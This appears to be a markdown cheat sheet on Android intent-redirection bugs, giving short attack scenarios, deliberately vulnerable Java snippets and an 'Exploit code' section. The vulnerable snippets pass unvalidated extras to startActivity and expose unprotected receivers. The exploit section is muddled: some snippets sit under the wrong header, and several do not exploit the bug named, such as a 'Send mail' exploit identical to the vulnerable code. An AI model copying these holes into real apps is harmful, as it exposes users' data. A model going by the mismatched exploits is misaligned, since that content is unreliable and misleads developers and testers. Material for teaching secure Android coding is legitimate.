# Collection of Intent Redirection bug

Unvalidated Intent URI:
An attacker could craft a malicious link containing an intent URI that redirects the user to a phishing site or installs a malware app.

Dynamic Class Name:
An attacker could provide a malicious class name that points to a malicious activity or service and potentially steal user data or perform other malicious activities.

Unvalidated Intent Action:
An attacker could provide a malicious action that points to a malicious activity or service and potentially steal user data or perform other malicious activities.

Implicit Intent without specifying package:
An attacker could craft a fake "Send mail" dialog that intercepts and steals the email content or sends the email to a malicious email address.

Hardcoded External App Package Name:
An attacker could create a fake app with the same package name as the hardcoded package name, tricking the user into installing the malicious app and potentially stealing user data or performing other malicious activities.

Using an Intent Filter for Sensitive Data:
An attacker could intercept the implicit intent broadcast and steal the sensitive data or perform other malicious activities.

Explicit Intent with Set Component:
An attacker could replace the original component with a malicious component to steal user data or perform other malicious activities.

Intent without Permission Check:
An attacker could intercept the intent and modify the "data" parameter to steal user data or perform other malicious activities.

Unprotected Broadcast Receiver:
An attacker could send a malicious broadcast intent with the same action name, causing the receiver to process the malicious data and potentially steal user data or perform other malicious activities.

Implicit Intent with Data Scheme:
An attacker could intercept the intent and modify the URI to redirect the user to a phishing site or install a malware app.


## Vulnerable code

Unvalidated Intent URI:
```java
String url = getIntent().getStringExtra("url");
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse(url));
startActivity(intent);
```
Dynamic Class Name:
```java
String className = getIntent().getStringExtra("class_name");
Intent intent = new Intent();
intent.setClassName(getPackageName(), className);
startActivity(intent);
```
Unvalidated Intent Action:
```java
String action = getIntent().getStringExtra("action");
Intent intent = new Intent(action);
startActivity(intent);
```
Implicit Intent without specifying package:
```java
Intent intent = new Intent(Intent.ACTION_SEND);
intent.setType("text/plain");
intent.putExtra(Intent.EXTRA_SUBJECT, "Subject");
intent.putExtra(Intent.EXTRA_TEXT, "Text");
startActivity(Intent.createChooser(intent, "Send mail"));

```
Hardcoded External App Package Name:

```
Intent intent = new Intent();
intent.setAction(Intent.ACTION_VIEW);
intent.setData(Uri.parse("https://example.com"));
intent.setPackage("com.example.externalapp");
startActivity(intent);

```
Using an Intent Filter for Sensitive Data:
```java
Intent intent = new Intent();
intent.setAction(Intent.ACTION_SEND);
intent.setType("text/plain");
intent.putExtra(Intent.EXTRA_TEXT, "Sensitive Data");
startActivity(intent);
```
Explicit Intent with Set Component:

```
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.example.app", "com.example.app.MainActivity"));
startActivity(intent);
```
Intent without Permission Check:
```java
Intent intent = new Intent();
intent.setAction("com.example.action");
intent.putExtra("data", "Sensitive Data");
startActivity(intent);
```
Unprotected Broadcast Receiver:
```java
public class MyBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String data = intent.getStringExtra("data");
        // Process data
    }
}

<receiver android:name=".MyBroadcastReceiver">
    <intent-filter>
        <action android:name="com.example.action" />
    </intent-filter>
</receiver>

```

Implicit Intent with Data Scheme:
```java
Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://example.com"));
startActivity(intent);

```

Unvalidated Intent URI:
```java
Uri uri = Uri.parse("http://malicious-site.com");
Intent intent = new Intent(Intent.ACTION_VIEW, uri);
startActivity(intent);
```
Dynamic Class Name:
```java
String className = "com.example.malware.MaliciousActivity";
Intent intent = new Intent();
intent.setClassName(getApplicationContext(), className);
startActivity(intent);
```

## Exploit code 

Unvalidated Intent Action:
```java
String action = "com.example.malware.ACTION_ATTACK";
Intent intent = new Intent(action);
startActivity(intent);
```
Implicit Intent without specifying package:
```java
Intent intent = new Intent(Intent.ACTION_SEND);
intent.setType("text/plain");
intent.putExtra(Intent.EXTRA_SUBJECT, "Subject");
intent.putExtra(Intent.EXTRA_TEXT, "Content");
startActivity(Intent.createChooser(intent, "Send mail"));
```
Hardcoded External App Package Name:
```java
Intent intent = getPackageManager().getLaunchIntentForPackage("com.example.malware");
startActivity(intent);
```
Using an Intent Filter for Sensitive Data:
```java
Intent intent = new Intent();
intent.setAction("com.example.SENSITIVE_DATA");
intent.putExtra("password", "sensitive-data");
sendBroadcast(intent);
```
Explicit Intent with Set Component:
```java
ComponentName component = new ComponentName("com.example.malware", "com.example.malware.MaliciousActivity");
Intent intent = new Intent();
intent.setComponent(component);
startActivity(intent);
```
Intent without Permission Check:
```java
Uri uri = Uri.parse("content://com.example.provider/data");
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(uri);
startActivity(intent);
```
Unprotected Broadcast Receiver:
```java
public class MyBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String data = intent.getStringExtra("data");
        // do something with the data, such as send it to a server
    }
}
```
Implicit Intent with Data Scheme:
```java
Uri uri = Uri.parse("http://malicious-site.com");
Intent intent = new Intent(Intent.ACTION_VIEW, uri);
startActivity(intent);
```
